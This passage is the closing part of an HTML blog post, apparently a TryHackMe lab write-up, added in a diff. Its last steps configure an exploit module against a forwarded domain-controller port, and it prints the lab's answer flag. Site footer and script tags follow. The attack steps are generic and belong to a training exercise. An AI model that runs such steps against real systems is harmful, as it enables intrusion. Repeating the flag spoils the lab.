+<li>set bindaddress to localhost</li>
+<li>configure ports</li>
+<li>set rhost to localhost (wherever we forwarded the port 80 of the dc)</li>
+<li>And run!</li>
+<li>THM{FORWARDING_IT_ALL}</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+	</div>
+	<hr class="post-end">
+	<footer class="post-info">
+    
+    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>900 Words</p>
+    
+    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2025-03-02</p>
+    
+	</footer>
+  </article>
+    
+  
+  <div class="post-nav thin">
+	
+	
+  </div>
+
+  
+</main>
+
+	  </div>
+	  
+	  
+
+
+
+<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+  <p>&copy; 2025 <a href="https:&#x2F;&#x2F;markwilkinson.tech">Mark Wilkinson</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+  <p>Made with <a href="https://www.getzola.org" target="_blank" rel="noopener">Zola</a> &#183; Theme <a href="https://github.com/VersBinarii/hermit_zola" target="_blank" rel="noopener">Hermit_Zola</a>
+	
+  </p>
+</footer>
+
+
+
+
+	</div>
+	
+	<script src="https://markwilkinson.tech/js/main.js"></script>
+
+	<!-- Math rendering -->
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+        onload="renderMathInElement(document.body, { delimiters: [ {left: '$$', right: '$$', display: true}, {left: '$', right: '$', display: false}, {left: '\\[', right: '\\]', display: true}, {left: '\\(', right: '\\)', display: false}]});"></script>
+
+    
+		<link href="https://unpkg.com/highlightjs-badge/highlightjs/styles/vs2015.css" rel="stylesheet">
+		<!-- https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.1/build/styles/  for min version -->
+		<script src="https://unpkg.com/highlightjs-badge/highlightjs/highlight.pack.js"></script>
+		<script src="https://unpkg.com/highlightjs-badge/highlightjs-badge.min.js"></script>
+		<script>
+			var pres = document.querySelectorAll("pre>code");
+			for (var i = 0; i < pres.length; i++) {
+				hljs.highlightBlock(pres[i]);
+			}
+		</script>
+		
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script>
+			<script>
+				var options = {
+					copyIconClass: "gg-clipboard",
+					checkIconClass: "gg-check"
+				};
+				window.highlightJsBadge(options);
+			</script>
+		
+
+	
+
+	
+	<script src="https://markwilkinson.tech/js/main.js"></script>
+
+    
+    
+
+	
+  </body>
+</html>
